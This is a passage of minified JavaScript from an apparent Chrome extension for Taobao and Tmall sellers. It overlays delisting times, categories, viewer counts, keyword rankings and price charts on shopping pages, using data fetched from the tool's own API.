var bg = chrome.extension.connect({
    name: "doali"
});

function getListMax(a) {
    var c, d, b = new Array();
    for (c = 0; c < a.length; c++) isNaN(a[c]) || b.push(a[c]);
    if (b.length > 0) {
        if (d = b[0], b.length > 1) for (c = 1; c < b.length; c++) d = Math.max(d, b[c]);
        return d;
    }
    return void 0;
}

function getListMin(a) {
    var c, d, b = new Array();
    for (c = 0; c < a.length; c++) isNaN(a[c]) || b.push(a[c]);
    if (b.length > 0) {
        if (d = b[0], b.length > 1) for (c = 1; c < b.length; c++) d = Math.min(d, b[c]);
        return d;
    }
    return void 0;
}

function tm_trade_ret_fun(a) {
    tm_trade_ret = a;
}

function search_ret_fun(a) {
    g_search_ret = a;
}

function alitrip_trade_ret_fun(a) {
    alitrip_trade_ret = a;
}

function getKw_list_html(a) {
    return kw_list_html.replace("展现关键词", a);
}

function intVersion(a) {
    return parseInt(a.replace(/\./gi, ""));
}

var sortby, cache_cats, DAMY, rank_array, ret_t_set, http_css_url, https_css_url, class_img_https_url, item_html, kw_list_html, tm_trade_ret, g_search_ret, alitrip_trade_ret, shop_html, search_html, ztc_search_html, mobile_kw_html, ztc_html, search_html_v2, loading_opt, nodata_loading_opt, chart_opt, price_data, curr_ver, _hmt, http, dzt_url;

Date.prototype.format = function(a) {
    var d, b = {
        "M+": this.getMonth() + 1,
        "d+": this.getDate(),
        "h+": 0 == this.getHours() % 12 ? 12 : this.getHours() % 12,
        "H+": this.getHours(),
        "m+": this.getMinutes(),
        "s+": this.getSeconds(),
        "q+": Math.floor((this.getMonth() + 3) / 3),
        S: this.getMilliseconds()
    }, c = {
        0: "日",
        1: "一",
        2: "二",
        3: "三",
        4: "四",
        5: "五",
        6: "六"
    };
    /(y+)/.test(a) && (a = a.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length))), 
    /(E+)/.test(a) && (a = a.replace(RegExp.$1, (RegExp.$1.length > 1 ? RegExp.$1.length > 2 ? "星期" : "周" : "") + c[this.getDay() + ""]));
    for (d in b) new RegExp("(" + d + ")").test(a) && (a = a.replace(RegExp.$1, 1 == RegExp.$1.length ? b[d] : ("00" + b[d]).substr(("" + b[d]).length)));
    return a;
}, sortby = function(a, b) {
    return function(c, d) {
        var e, f;
        return c && d && "object" == typeof c && "object" == typeof d ? (e = c[a], f = d[a], 
        e === f ? "function" == typeof b ? b(c, d) : 0 : typeof e == typeof f ? f > e ? -1 : 1 : typeof f > typeof e ? -1 : 1) : (console.error("error"), 
        void 0);
    };
}, cache_cats = {}, window.curr_date = Date.now(), DAMY = new Object(), http_css_url = "http://ssl.tqdn.cn/static/api_css.css?q=20160414", 
https_css_url = "https://ssl.tqdn.cn/static/api_css.css?q=20160414", class_img_https_url = "https://ssl.tqdn.cn/static/images/class.png?d=20160517", 
item_html = "", kw_list_html = '<table><thead><tr><th class="th-ci"><span class="ext-arrow ext-arrow-top"></span><b>展现关键词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody><tr><td colspan="2">加载中...</td></tr></tbody></table>', 
shop_html = '<div class="dztbar-detail dzt_clear" pid="-pid-"><div class="dztbar-t-l"> 下架：<a title="" style="color:#f35a4a;" id="dzt-del-time" href="javascript:;"><div class="dzt-loading-po"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div></a> &nbsp;&nbsp;&nbsp;类目：<a title="" style="color:#f35a4a;" id="dzt-cat" href="javascript:;"><div class="dzt-loading-po"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div></a> &nbsp;&nbsp;&nbsp;在线：<a title="当前在线浏览宝贝的人数（仅PC端）" style="color:#f35a4a;" href="javascript:;" id="view_count_-pid-"><div class="dzt-loading-po"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div></a>人 &nbsp;&nbsp;&nbsp;<span id="dzt-mprice"></span><br/><span class="dzt-ci-title"><span class = "tm-coupon-panel">搜索展现<span class="dzt-arrow-r">&nbsp;</span></span></span><span class="dzt-ci-hover" data-t="tb">淘宝展现（<span id="dzt-tb-count"></span>）<div class="dzt-ci-table dzt-ci-tb">' + getKw_list_html("淘宝展现词") + "</div></span>" + '<span class="dzt-ci-hover" data-t="ztc_tb">淘宝直通车（<span id="dzt-tb-ztc-count"></span>）<div class="dzt-ci-table dzt-ci-tb-ztc-dfk">' + getKw_list_html("淘宝PC直通车词") + "</div></span>" + '<span class="dzt-ci-hover" data-t="tmall" id="dzt-tmall">天猫展现（<span id="dzt-tmall-count"></span>）<div class="dzt-ci-table dzt-ci-tmall">' + getKw_list_html("天猫搜索展现词") + "</div></span>" + '<span class="dzt-ci-hover" data-t="ztc_tmall" id="dzt-tmall-ztc">天猫直通车（<span id="dzt-tmall-ztc-count"></span>）<div class="dzt-ci-table dzt-ci-tmall-ztc">' + getKw_list_html("天猫直通车词") + "</div></span>" + '<span class="dzt-ci-hover" data-t="mobile">无线展现（<span id="dzt-mobile-count"></span>）<div class="dzt-ci-table dzt-ci-moble">' + getKw_list_html("无线展现词") + "</div></span>" + '<span class="dzt-ci-hover" data-t="ztc_mobile">无线直通车（<span id="dzt-mobile-ztc-count"></span>）<div class="dzt-ci-table dzt-ci-mobile-ztc">' + getKw_list_html("无线直通车词") + "</div></span>" + "</div>" + "</div>", 
search_html = '<div class="dzt-product-info-bar"><div style="display:none;" id="dzt_time_-pid-"><span class="ext-logo14 time-logo14"></span><span class="dzt-mr5">下架:<b class="b" title="-">-</b></span><span class="dzt-online-viewer" title="当前在线浏览宝贝的人数（仅PC端）" style="cursor:pointer;">在线:<b style="color:#ff0000;" id="view_count_-pid-">－</b>人</span></div><div><span class="ext-logo14"></span>展现词:<span class="dzt-search dzt-ci-hover" data-t="-dzt-t-"><!--search-type-->(<span href="javascript:;" class="dzt-list-tb-val" style="color:#ff0000">-</span>)<div class="dzt-ci-table dzt-ci-tb"><table><thead><tr><th class="th-ci"><span class="ext-arrow ext-arrow-top"></span><b><!--search-type-->搜索展现词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody></tbody></table></div></span> <!--ztc_search_html--></div><!--mobile_html--></div>', 
ztc_search_html = '<span id="dzt-product-ztc-info" class="dzt-search dzt-ci-hover" data-t="ztc_-dzt-t-">直通车(<span href="javascript:;" class="dzt-list-ztc-val" style="color:#ff0000">-</span>)<div class="dzt-ci-table dzt-ci-ztc-tb"><table><thead><tr><th class="th-ci"><span class="ext-arrow ext-arrow-top"></span><b><!--search-type-->直通车展现词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody></tbody></table></div></span>', 
mobile_kw_html = '<div><span class="ext-logo14"></span>无线端:<span class="dzt-search dzt-ci-hover" data-t="mobile">搜索(<span href="javascript:;" class="dzt-list-mobile-val" style="color:#ff0000">-</span>)<div class="dzt-ci-table dzt-ci-mobile"><table><thead><tr><th class="th-ci"><span class="ext-arrow ext-arrow-top"></span><b>无线搜索展现词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody></tbody></table></div></span> <span class="dzt-search dzt-ci-hover" data-t="ztc_mobile">直通车(<span href="javascript:;" class="dzt-list-ztc-mobile-val" style="color:#ff0000">-</span>)<div class="dzt-ci-table dzt-ci-ztc-mobile"><table><thead><tr><th class="th-ci"><span class="ext-arrow ext-arrow-top"></span><b>无线直通车展现词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody></tbody></table></div></span> </div>', 
ztc_html = '<p class="dzt-ext-tmall-ztc-bar" style="padding:5px 0px"><span class="ext-logo14 dzt-logo14"></span> <a href="http://www.dianzhentan.com/?z=sug">直通车：天猫（<span style="color:#ff0000" class="dzt-tmall-val">-</span>）无线（<span style="color:#ff0000" class="dzt-mobile-val">-</span>）</a></p><p class="dzt-ext-tmall-ztc-bar" style="padding:5px 0px"><span class="ext-logo14 kdb-logo14"></span> <a href="#">直通车分析</a></p>', 
search_html_v2 = '<div class="dzt-product-info-bar"><div style="display:none;" id="dzt_time_-pid-"><span class="ext-logo14 time-logo14"></span><span class="dzt-mr5">下架:<b class="b" title="-">-</b></span></div><div><span class="ext-logo14 kdb-logo14"></span> <span title="当前在线浏览宝贝的人数（仅PC端）" style="cursor:pointer;">在线:<b style="color:#ff0000;" id="view_count_-pid-">－</b>人</span> <div class="dzt-hover-tip" style="display:none;" id="dzt_cat_-pid-"><a href="javascript:;">类目</a><div class="dzt-tip-container">加载中..</div></div> <div class="price_link"><a href="javascript:;">调价</a><div class="chart_container"><div class="chart" loaded="false" pid="-pid-"></div></div></div></div><div><span class="ext-logo14 dzt-logo14"></span> <span class="dzt-search dzt-ci-hover" data-t="-dzt-t-"><!--search-type-->(<span href="javascript:;" class="dzt-list-tb-val" style="color:#ff0000">-</span>)<div class="dzt-ci-table dzt-ci-tb"><table><thead><tr><th class="th-ci"><a href="http://www.dianzhentan.com/?z=sug" style="color:#ccc;" target="_blank">dianzhentan.com</a><b><!--search-type-->搜索展现词</b></th><th class="th-rank"><b>排名</b></th></tr></thead><tbody></tbody></table></div></span> <!--ztc_search_html--></div>' + mobile_kw_html.replace("无线端:", "").replace('"mobile">搜索', '"mobile">无线搜索') + "</div>", 
loading_opt = {
    text: "加载中...",
    effect: "bar",
    textStyle: {
        color: "#222",
        fontSize: 16
    }
}, nodata_loading_opt = {
    text: "暂无数据.",
    effect: "whirling",
    textStyle: {
        color: "#ff0000",
        fontSize: 16
    }
}, chart_opt = {
    animationDuration: 500,
    animationEasing: "CircularInOut",
    color: [ "#f35a4a", "#4184f3" ],
    grid: {
        x: 60,
        y: 30,
        x2: 35,
        y2: 40,
        borderWidth: 0
    },
    tooltip: {
        trigger: "axis",
        showDelay: 0,
        hideDely: 100,
        transitionDuration: 0,
        backgroundColor: "rgba(255,255,255,0.9)",
        borderColor: "#e7e7e7",
        borderRadius: 2,
        borderWidth: 1,
        textStyle: {
            color: "#222"
        },
        formatter: function(a) {
            var d = "日期：" + a[0].name;
            return d += "<br/>" + a[0].seriesName + "：" + a[0].value + " 元";
        },
        axisPointer: {
            type: "line",
            lineStyle: {
                color: "#999",
                width: 1,
                type: "dotted"
            }
        }
    },
    legend: {
        show: !1,
        data: [ "价格" ],
        orient: "horizontal",
        x: "left",
        y: "bottom"
    },
    toolbox: {
        show: !1
    },
    calculable: !1,
    xAxis: [ {
        type: "category",
        splitLine: {
            lineStyle: {
                type: "dotted"
            }
        },
        boundaryGap: !1,
        axisLine: {
            lineStyle: {
                color: "#999",
                width: 1
            }
        },
        axisTick: {
            show: !1
        },
        data: [ 0 ]
    } ],
    yAxis: [ {
        type: "value",
        axisLine: {
            lineStyle: {
                color: "#999",
                width: 1
            }
        },
        scale: !0,
        splitNumber: 4,
        splitLine: {
            lineStyle: {
                type: "dotted"
            }
        },
        axisLabel: {
            formatter: function(a) {
                return parseInt(a) + " 元";
            }
        }
    } ],
    series: [ {
        name: "价格",
        type: "line",
        symbolSize: 1,
        itemStyle: {
            normal: {
                label: {
                    show: !0,
                    formatter: function(a, b, c) {
                        return c;
                    },
                    textStyle: {
                        fontSize: 12,
                        color: "#f35a4a"
                    }
                },
                lineStyle: {
                    color: "#f35a4a"
                }
            },
            emphasis: {
                label: {
                    show: !0,
                    formatter: function() {},
                    textStyle: {
                        color: "rgba(0,0,0,0)"
                    }
                }
            }
        },
        data: [ 0 ]
    } ]
}, curr_ver = "1.0.0.7", _hmt = _hmt || [], http = "http", dzt_url = "http://cj.dianzhentan.com", 
DAMY.loader = {
    cat_cache: {},
    init_page: function() {
        var a = window.location.href;
        0 == a.indexOf("https") && (http = "https", dzt_url = "https://ssl.dianzhentan.com"), 
        $.ajax({
            url: http + "://api.m.taobao.com/rest/api3.do?api=mtop.common.getTimestamp",
            cache: !1,
            error: function() {
                console.error("ERROR！无法获取网络时间，请检查是否使用了代理服务器。我们将使用您的本地电脑时间，若本地时间设置不对，将导致计算的下架时间有误!!");
            },
            success: function(a) {
                a && a.data && (window.curr_date = parseInt(a.data.t));
            },
            complete: function() {
//                var d, c = document.createElement("script");
//                c.src = "//hm.baidu.com/hm.js?73a389ead45490aaf952f750657e830f", d = document.getElementsByTagName("script")[0], 
//                d.parentNode.insertBefore(c, d), DAMY.loader.start_page();
            }
        });
    },
    start_page: function() {
        var b, c, d, e, f, g, h, i, j, k, l, a = http_css_url;
        return "https" == http && (a = https_css_url), $("<link>").attr({
            rel: "stylesheet",
            type: "text/css",
            href: a
        }).appendTo("head"), b = window.location.href, c = !1, d = !1, e = $("#J_PromoPrice"), 
        0 == e.length && (e = $(".tb-meta li.tb-promo")), f = DAMY.loader.get_shop_info(), 
        f.istmall || f.isalitrip || f.istmall_alitrip_p ? (d = !0, c = !0) : f.istb && (c = !0), 
        c ? ($('input[name="item_id"]').length ? (f.istmall = !1, i = $(".tb-seller-name").attr("title"), 
        i && (i = i.replace(/掌柜:/g, ""))) : (i = $(".slogo-shopname").text(), f.istmall = !0), 
        $(".shop-type-icon-enterprise").length > 0 && !i && (i = $(".summary-popup.J_TSummaryPopup .shop-more-info p.info-item:eq(2)").text().replace(/掌\s+柜：/, "")), 
        $("#LineZing").length ? (g = $("#LineZing").attr("itemid"), h = $("#LineZing").attr("shopid")) : (g = $('input[name="item_id"]').val(), 
        h = $('[name="microscope-data"]').attr("content"), h && (h = h.split("shopId=")[1].split(";")[0])), 
        j = item_html.replace(/-id-/g, g), j = j.replace(/-shopid-/g, h), j = j.replace(/-nick-/g, encodeURIComponent(i)), 
        $(j).insertAfter(e), k = $("body").html(), k = k.split("category=")[1], k = k.split("&")[0], 
        k = k.replace("item%5f", ""), j = shop_html, j = j.replace(/-pid-/g, g), j = $(j), 
        j.find(".price_link").hover(function() {
            DAMY.loader.price_on(this);
        }, function() {
            $(this).is(":not(.dzt_pin)") && DAMY.loader.price_out(this);
        }), j.find(".price_link").click(function(a) {
            var b = a.target == $(".price_link>a").get(0);
            $(this).is(".dzt_pin") && a.target == $(".price_link>a").get(0) ? DAMY.loader.price_out(this) : DAMY.loader.price_on(this), 
            b && $(this).toggleClass("dzt_pin");
        }), j.find(".dzt_tool_same_item").hover(function() {
            DAMY.loader.same_item_on(this);
        }, function() {
            $(this).is(":not(.dzt_pin)") && DAMY.loader.same_item_out(this);
        }), j.find(".dzt_tool_same_item").click(function(a) {
            var b = a.target == $(".dzt_tool_same_item>a").get(0);
            $(this).is(".dzt_pin") && b ? DAMY.loader.same_item_out(this) : DAMY.loader.same_item_on(this), 
            b && $(this).toggleClass("dzt_pin");
        }), j.find(".dzt_tool_ck_rank").hover(function() {
            DAMY.loader.ck_rank_on(this);
        }, function() {
            $(this).is(":not(.dzt_pin)") && DAMY.loader.ck_rank_out(this);
        }), j.find(".dzt_tool_ck_rank").click(function(a) {
            var b = a.target == $(".dzt_tool_ck_rank>a").get(0);
            $(this).is(".dzt_pin") && b ? DAMY.loader.ck_rank_out(this) : DAMY.loader.ck_rank_on(this), 
            b && $(this).toggleClass("dzt_pin");
        }), f.istmall || (j.find("#dzt-tmall").remove(), j.find("#dzt-tmall-ztc").remove()), 
        l ? (j.find("#dzt-del-time").attr("title", l.format("yyyy-MM-dd EEE HH:mm")), j.find("#dzt-del-time").html(l.format("EEE HH:mm"))) : (l = -1, 
        $("script").each(function() {
            var a = $(this).html(), b = /ends=(\d+)&/g, c = b.exec(a);
            return c && 2 == c.length && (l = c[1]) ? (l = DAMY.loader.getDate(l), j.find("#dzt-del-time").attr("title", l.format("yyyy-MM-dd EEE HH:mm")), 
            j.find("#dzt-del-time").html(l.format("EEE HH:mm")), !1) : void 0;
        })), j.find(".dzt-ci-hover").mouseover(function() {
            DAMY.loader.load_kwlist(this, g);
        }), j.find("#dzt_tool_start_ck_rank").click(function() {
            var b, a = $.trim($("#dzt_ck_rank_kw").val());
            return "" == a ? ($("#dzt_ck_rank_ret").html("请输入关键词！"), void 0) : (b = $("#dzt_ck_type").val(), 
            $(this).removeClass("dzt_btn_danger").attr("disabled", "disabled").text("搜索中..."), 
            DAMY.loader.ck_rank(a, b, g, 0, !1), void 0);
        }), $("#id2").prepend(j), g && $.get("https://ssl.dianzhentan.com/api/time/" + g, function(a) {
            var b, c;
            a && a.t && (a.t > 0 ? (b = 1e3 * a.t, b < window.curr_date && (b += 6048e5), c = DAMY.loader.getDate(b), 
            $(".dztbar-detail #dzt-del-time").attr("title", c.format("yyyy-MM-dd EEE HH:mm")).html(c.format("EEE HH:mm"))) : $(".dztbar-detail #dzt-del-time").attr("title", "-").html("-"));
        }), k && $.get("https://ssl.dianzhentan.com/api/cat", {
            cid: k
        }, function(a) {
            a && a.cat && ($(".dztbar-detail #dzt-cat").html(a.cat), $(".dztbar-detail #dzt-cat").attr("title", a.fcat));
        }), $.get(dzt_url + "/api/item", {
            id: g,
            tmall: f.istmall ? 1 : 0
        }, function(a) {
            $(".dztbar-detail #dzt-tb-count").html(a.tb), $(".dztbar-detail #dzt-tb-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug"), 
            $(".dztbar-detail #dzt-tb-ztc-count").html(a.z), $(".dztbar-detail #dzt-tb-ztc-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug&f=ztc_tb"), 
            $(".dztbar-detail #dzt-mobile-count").html(a.m), $(".dztbar-detail #dzt-mobile-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug&f=mobile"), 
            $(".dztbar-detail #dzt-mobile-ztc-count").html(a.mz), $(".dztbar-detail #dzt-mobile-ztc-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug&f=ztc_mobile"), 
            f.istmall && ($(".dztbar-detail #dzt-tmall-count").html(a.tm), $(".dztbar-detail #dzt-tmall-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug&f=tmall"), 
            $(".dztbar-detail #dzt-tmall-ztc-count").html(a.tz), $(".dztbar-detail #dzt-tmall-ztc-count").attr("href", "http://ci.dianzhentan.com/item/" + g + "/?z=sug&f=ztc_tmall"));
        }), DAMY.loader.render_view(g, 1), DAMY.loader.load_same_item(), void 0) : (b.indexOf("://list.tmall.com/search_product.htm") >= 0 ? (d = !0, 
        this.render_tmall()) : (b.indexOf(".tmall.com/category") >= 0 || b.indexOf(".tmall.com/search.htm") >= 0) && (d = !0, 
        this.render_tmallstore()), b.indexOf("://s.taobao.com/") >= 0 ? b.indexOf("tab=mysearch") >= 0 ? this.render_mysearch() : b.indexOf("type=samestyle") >= 0 || b.indexOf("type=similar") >= 0 ? this.render_same() : this.render_tb() : (-1 != b.indexOf(".taobao.com/search.htm") || b.indexOf(".jiyoujia.com/search.htm") > 0) && this.render_store(), 
        b.indexOf("://list.taobao.com/") >= 0 && this.render_list(), (b.indexOf(".taobao.com/category") >= 0 || b.indexOf(".jiyoujia.com/category") > 0) && this.render_tbshopcat(), 
        b.indexOf("://qiang.taobao.com/") >= 0 && (b.indexOf("://qiang.taobao.com/category.htm") >= 0 ? this.render_tqg(!0) : this.render_tqg(!1)), 
        (b.indexOf("://qing.taobao.com") >= 0 || b.indexOf("://ju.taobao.com/qing") >= 0) && this.render_qing(), 
        b.indexOf("ju.taobao.com") >= 0 && (b.indexOf("://detail.ju.taobao.com/home.htm") >= 0 ? this.render_judetail() : this.render_jhs()), 
        b.indexOf("guang.taobao.com") >= 0 && (b.indexOf("guang.taobao.com/detail/index.htm") >= 0 ? this.render_guang_item() : this.render_guang()), 
        b.indexOf("taotelaisi.taobao.com") >= 0 && this.render_taotelaisi(), (b.indexOf("://q.taobao.com/") >= 0 || b.indexOf("://www.taobao.com/markets/quality/list") >= 0) && this.render_quality(), 
        (b.indexOf("://www.taobao.com/market/p/") >= 0 || b.indexOf("://pp.taobao.com/")) && this.render_pp(), 
        (b.indexOf("www.taobao.com/market/nvzhuang/") >= 0 || b.indexOf("://nz.taobao.com/") >= 0 || b.indexOf("://nvren.taobao.com/") >= 0) && (b.indexOf("://nvren.taobao.com/") >= 0 ? this.render_nvzhuang(!0) : this.render_nvzhuang(!1)), 
        b.indexOf("://taojinbi.taobao.com/") >= 0 && this.render_tjb(), b.indexOf("://chi.taobao.com/itemlist/") >= 0 && this.render_hc(), 
        (b.indexOf("://tejia.taobao.com/") >= 0 || b.indexOf("://www.taobao.com/market/tejia/") >= 0) && this.render_tttj(), 
        b.indexOf("://g.taobao.com/brand_detail.htm") >= 0 && this.render_global(), b.indexOf("://list.tmall.hk/search_product.htm") >= 0 && this.render_tmallgj(), 
        b.indexOf("://www.zhe800.com") >= 0, b.indexOf("://www.taofen8.com") >= 0 && this.render_tf8(), 
        b.indexOf("://www.huiyuangou.com/") >= 0 && this.render_hyg(), void 0);
    },
    get_shop_info: function() {
        var a = window.location.href, b = !1, c = !1, d = !1, e = !1;
        return a.indexOf("://detail.alitrip.com/item.htm") >= 0 && (c = !0), a.indexOf("://items.alitrip.com/item.htm") >= 0 && (d = !0), 
        (a.indexOf("://detail.tmall.com/item.htm") >= 0 || a.indexOf("://detail.tmall.hk/hk/item.htm") >= 0 || a.indexOf("://detail.yao.95095.com/item.htm") >= 0 || d || c) && (b = !0), 
        a.indexOf("://item.taobao.com/item.htm") >= 0 && (e = !0), {
            istb: e,
            istmall: b,
            isalitrip: d,
            istmall_alitrip_p: c
        };
    },
    render_hyg: function() {
        var b, c, a = ".goods-list";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find("li:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = $(this).find(".list-good").attr("id").replace(/nid_/gi, "");
            a && b.push(a), d = "", e = DAMY.loader.render_search(a, c, d, "tb"), e.find(".kdb-shop").detach(), 
            e.find(".kdb-search").detach(), e.find(".dzt-online-viewer").detach(), $(this).append(e);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_hyg();
        }, 2e3);
    },
    render_tf8: function() {
        var b, c, a = ".tf8_sp_ul";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find("li:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = $(this).attr("itemid");
            a || (a = $(this).find(".index_item_maodian").attr("name").replace(/item_/gi, "")), 
            a && b.push(a), d = "", e = DAMY.loader.render_search(a, c, d, "tb"), e.find(".kdb-shop").detach(), 
            e.find(".kdb-search").detach(), e.find(".dzt-online-viewer").detach(), $(this).append("<div class='dzt_clear'></div>"), 
            $(this).append(e);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_tf8();
        }, 2e3);
    },
    render_zhe800: function() {},
    render_tbshopcat: function() {
        var b, c, a = ".item3line1,.item30line1";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find(".item:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = DAMY.loader.seach_item_id(this);
            a && b.push(a), d = "", e = DAMY.loader.render_search(a, c, d, "tb"), e.find(".kdb-shop").detach(), 
            e.find(".kdb-search").detach(), $(this).append(e);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_tbshopcat();
        }, 2e3);
    },
    render_qing: function() {
        var b, c, a = ".item-list";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find(".item-card:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = DAMY.loader.seach_item_id(this);
            a && b.push(a), d = "", e = DAMY.loader.render_search(a, c, d, "tb"), e.find(".kdb-shop").detach(), 
            e.find(".kdb-search").detach(), $(this).append(e);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_qing();
        }, 2e3);
    },
    render_quality: function() {
        var b, c, a = ".zgzz-zxd-wrap .itemlist,.zqx-itemlist,.recommend-itemlist";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find("li.listitem:not(:has(.dzt-product-info-bar)),li.zqx-item:not(:has(.dzt-product-info-bar)),li.recommend-item:not(:has(.dzt-product-info-bar))").each(function() {
            var a, e, f, d = /item\.htm\?.*id=(\d+)/i;
            $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            }), a && b.push(a), e = "", f = DAMY.loader.render_search(a, c, e, "tb"), f.find(".kdb-shop").detach(), 
            f.find(".kdb-search").detach(), $(this).append(f);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_quality();
        }, 2e3);
    },
    render_pp: function() {
        var b, c, a = ".p-cat-wrapper";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find("li.p-cat-item:not(:has(.dzt-product-info-bar))").each(function() {
            var a, e, f, d = /item\.htm\?id=(\d+)/i;
            $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            }), a && b.push(a), e = "", f = DAMY.loader.render_search(a, c, e, "tb"), f.find(".kdb-shop").detach(), 
            f.find(".kdb-search").detach(), $(this).append(f);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_pp();
        }, 2e3);
    },
    render_taotelaisi: function() {
        var b, c, a = ".wrap .content ul.product-content ";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find("li.content-item:not(:has(.dzt-product-info-bar))").each(function() {
            var a, e, f, d = /item\.htm\?id=(\d+)/i;
            $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            }), a && b.push(a), e = "", f = DAMY.loader.render_search(a, c, e, "tb"), f.find(".kdb-shop").detach(), 
            f.find(".kdb-search").detach(), $(this).append(f);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_taotelaisi();
        }, 2e3);
    },
    render_nvzhuang: function(a) {
        var c, d, b = "#J_ModuleList.list,.J_Slide_El .tab-pannel,.J_ModuleSlide .tab-pannel";
        $(b).length <= 0 || (c = new Array(), d = "", $(b).find("li:not(:has(.dzt-product-info-bar)),.float-box:not(:has(.dzt-product-info-bar)),.item-info:not(:has(.dzt-product-info-bar))").each(function() {
            var b, f, g, e = /item\.htm\?.*id=(\d+)/i;
            $(this).find("a").each(function() {
                var c, a = $(this).attr("href");
                "undefined" == typeof b && e.test(a) && (c = e.exec(a), b = c[1]);
            }), b && c.push(b), f = "", g = a ? DAMY.loader.render_search(b, d, f, "tb", search_html_v2) : DAMY.loader.render_search(b, d, f, "tb"), 
            g.find(".kdb-shop").detach(), g.find(".kdb-search").detach(), $(this).append(g);
        }), c.length > 0 && DAMY.loader.search_kws(c, "tb"), a && $(".J_dynamic").css("height", "660px")), 
        setTimeout(function() {
            DAMY.loader.render_nvzhuang();
        }, 2e3);
    },
    render_guang_item: function() {
        var b, c, a = ".detail-section";
        $(a).length <= 0 || (b = new Array(), c = "", $(".detail-section:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, f, a = /item\.htm\?id=(\d+)/i;
            $(".comments-buy").find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof d && a.test(b) && (c = a.exec(b), d = c[1]);
            }), d && (b.push(d), e = "", f = DAMY.loader.render_search(d, c, e, "tb"), f.find(".kdb-shop").detach(), 
            f.find(".kdb-search").detach(), $(this).append(f));
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), this.render_guang(!0), setTimeout(function() {
            DAMY.loader.render_guang_item();
        }, 2e3);
    },
    render_guang: function(a) {
        var c, d, b = ".waterfall .waterfall-common";
        $(b).length <= 0 || (c = new Array(), d = "", $(b).find(".waterfall-common-inner:not(:has(.dzt-product-info-bar))").each(function() {
            var b, e, f, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (b = /&itemid=(\d+)/i, $(this).find("a").each(function() {
                var d, c = $(this).attr("href");
                "undefined" == typeof a && b.test(c) && (d = b.exec(c), a = d[1]);
            })), a && c.push(a), e = "", f = DAMY.loader.render_search(a, d, e, "tb"), f.find(".kdb-shop").detach(), 
            f.find(".kdb-search").detach(), $(this).append(f);
        }), c.length > 0 && DAMY.loader.search_kws(c, "tb")), a || setTimeout(function() {
            DAMY.loader.render_guang();
        }, 2e3);
    },
    render_tjb: function() {
        var a, b, c;
        "1" != $(".J_ItemPanel").attr("load") && $(".J_ItemPanel .topic-item").each(function() {
            var a = $(this).attr("class");
            $(this).removeClass("topic-item").removeClass("last-item").wrap('<div class="dzt-tjb-item ' + a + '"></div>');
        }), $(".J_ItemPanel .dzt-tjb-item").length > 0 ? $(".J_ItemPanel").attr("load", "1") : $(".J_ItemPanel").attr("load", "0"), 
        "1" != $(".J_TopicPanel").attr("load") && $(".J_TopicPanel .topic-item").each(function() {
            var a = $(this).attr("class");
            $(this).removeClass("topic-item").wrap('<div class="dzt-tjb-item ' + a + '"></div>');
        }), $(".J_TopicPanel .dzt-tjb-item").length > 0 ? $(".J_TopicPanel").attr("load", "1") : $(".J_TopicPanel").attr("load", "0"), 
        "1" != $(".J_BrandDetailList").attr("load") && $(".J_BrandDetailList .topic-item").each(function() {
            var a = $(this).attr("class");
            $(this).removeClass("topic-item").wrap('<div class="dzt-tjb-item ' + a + '"></div>');
        }), $(".J_BrandDetailList .dzt-tjb-item").length > 0 ? $(".J_BrandDetailList").attr("load", "1") : $(".J_BrandDetailList").attr("load", "0"), 
        $(".shop-money-list").each(function() {
            "1" != $(this).attr("load") && $(this).find(".brand-detail-item").each(function() {
                var a = $(this).attr("class");
                $(this).removeClass("brand-detail-item brand-detail-item-last").wrap('<div class="dzt-tjb-item ' + a + '"></div>');
            }), $(this).find(".dzt-tjb-item").length > 0 ? $(this).attr("load", "1") : $(this).attr("load", "0");
        }), a = ".J_ItemPanel,.J_TopicPanel,.J_BrandDetailList,.shop-money-list", $(a).length <= 0 || (b = new Array(), 
